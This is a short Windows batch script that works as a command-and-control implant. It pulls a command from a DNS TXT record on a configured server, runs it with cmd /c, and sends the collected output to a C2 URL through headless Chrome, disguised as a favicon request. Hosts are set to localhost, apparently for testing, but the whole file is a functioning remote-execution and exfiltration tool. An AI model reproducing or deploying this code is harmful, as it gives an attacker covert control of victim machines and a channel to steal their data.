@echo off
setlocal enabledelayedexpansion

:: config
set cncdns=127.0.0.1
set cnc=http://localhost:5000/favicon.ico

:: get
for /f "delims=? tokens=2" %%a in ('nslookup "-q=TXT" "example.com" "%cncdns%" 2^> nul ^| find "CMD?"') do (
    set command=%%a
)

if [!command!] == [] goto :eof

:: decode
set command=!command:~0,-1!

:: run
set lf=%%0D%%0A
for /F "delims=" %%i in ('cmd /c "!command!"') DO if ("!out!"=="") (set out=%%i) else (set out=!out!%lf%%%i)

:: exfil
start chrome --headless --disable-gpu !cnc!?r="!out!"
